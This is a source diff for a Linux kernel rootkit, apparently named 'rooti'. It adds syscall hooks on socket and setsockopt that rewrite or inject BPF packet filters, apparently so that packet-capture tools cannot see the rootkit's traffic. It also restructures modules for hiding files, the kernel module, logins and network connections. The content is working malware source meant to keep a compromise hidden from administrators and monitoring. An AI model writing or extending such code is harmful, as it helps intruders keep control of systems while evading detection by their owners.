@@ -6,15 +6,20 @@
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
 #include <linux/threads.h>
+#include <linux/file.h>
+#include <linux/filter.h>
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "hooking/utils.h"
 #include "hooking/syscall.h"
 #include "hooking/func.h"
 #include "capabilities/privilege.h"
-#include "capabilities/track.h"
-#include "capabilities/hide.h"
+#include "capabilities/tracking.h"
 #include "capabilities/unload.h"
+#include "capabilities/hiding/dentry.h"
+#include "capabilities/hiding/module.h"
+#include "capabilities/hiding/login.h"
+#include "capabilities/hiding/net.h"
 #include "utils.h"
 #include "config.h"
 
@@ -52,6 +57,8 @@ static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
 static asmlinkage long (*orig_dup3)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
+static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
+static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);
 
 // References to the original file operations which we are hooking
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
@@ -207,6 +214,69 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
 }
 
+static asmlinkage long hook_socket(const struct pt_regs *regs)
+{
+    struct socket *sock;
+    int family = regs->di;
+    int fd = orig_socket(regs);
+    
+    if (fd == -1 || family != AF_PACKET) {
+        return fd;
+    }
+
+    sock = sock_from_file(fget(fd));
+    if (sock == NULL) {
+        ROOTI_DEBUG("sock_from_file() failed");
+        return fd;
+    }
+    rooti_overwrite_traffic_filter(sock->sk);
+
+    return fd;
+}
+
+static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
+{
+    int fd = regs->di;
+    int optname = regs->dx;
+    int optlen = regs->r8;
+    sockptr_t optval = USER_SOCKPTR((char __user *)regs->r10);
+
+    struct socket *sock;
+    struct sock_fprog user_fprog;
+
+    int err = orig_setsockopt(regs);
+    if (err) {
+        return err;
+    }
+
+    sock = sock_from_file(fget(fd));
+    if (sock == NULL) {
+        ROOTI_DEBUG("sock_from_file() failed");
+        return 0;
+    }
+
+    switch (optname) {
+    case SO_ATTACH_FILTER:
+        err = copy_bpf_fprog_from_user(&user_fprog, optval, optlen);
+        if (err) {
+            ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
+            return 0;
+        }
+        
+        rooti_inject_traffic_filter(sock->sk, &user_fprog);
+        break;
+        
+    case SO_DETACH_FILTER:
+        rooti_overwrite_traffic_filter(sock->sk);
+        break;
+
+    default:
+        break;
+    }
+
+    return 0;
+}
+
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
@@ -275,7 +345,9 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup2"), hook_dup2, &orig_dup2),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup3"), hook_dup3, &orig_dup3),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt)
 };
 
 struct rooti_func_hook test_hook = ROOTI_FUNC_HOOK("strncpy_from_user", hook_strncpy_from_user, &orig_strncpy_from_user);
